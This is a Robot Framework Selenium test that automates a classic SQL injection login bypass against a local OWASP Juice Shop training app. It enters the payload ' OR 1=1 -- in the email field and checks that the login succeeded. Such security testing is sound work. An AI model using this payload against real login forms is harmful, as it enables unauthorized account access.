*** Settings ***
Documentation    Automated SQL Injection Attack on Juice Shop.
Library          SeleniumLibrary

*** Variables ***
${URL}           http://localhost:3000/#/login
${BROWSER}       headlesschrome
${SQLI_PAYLOAD}  ' OR 1=1 --
${DUMMY_PASS}    doesntexist

*** Test Cases ***
# To evaluate the overall security posture of the application, either by 
# checking fundamental security settings or by running a gauntlet of multiple attacks at once.
SQL Injection Authentication Bypass
    [Documentation]    Attempt to bypass the login screen using a classic SQLi payload.
    Open Juice Shop Login Page
    Dismiss Annoying Popups
    Inject SQL Payload And Login
    Verify Successful Bypass
    Close Browser

*** Keywords ***
Open Juice Shop Login Page
    Open Browser    ${URL}    ${BROWSER}
    Set Window Size  1920  1080

Dismiss Annoying Popups
    # Close the Welcome Banner
    Wait Until Element Is Visible    css=button[aria-label="Close Welcome Banner"]    timeout=5s
    Click Button                     css=button[aria-label="Close Welcome Banner"]
    
    # Dismiss the Cookie Consent banner
    Wait Until Element Is Visible    css=a[aria-label="dismiss cookie message"]    timeout=5s
    Click Element                    css=a[aria-label="dismiss cookie message"]

Inject SQL Payload And Login
    Wait Until Element Is Visible    id=email    timeout=5s
    Input Text      id=email       ${SQLI_PAYLOAD}
    Input Text      id=password    ${DUMMY_PASS}
    Click Button    id=loginButton

Verify Successful Bypass
    Wait Until Element Is Visible    css=button[aria-label="Show the shopping cart"]    timeout=5s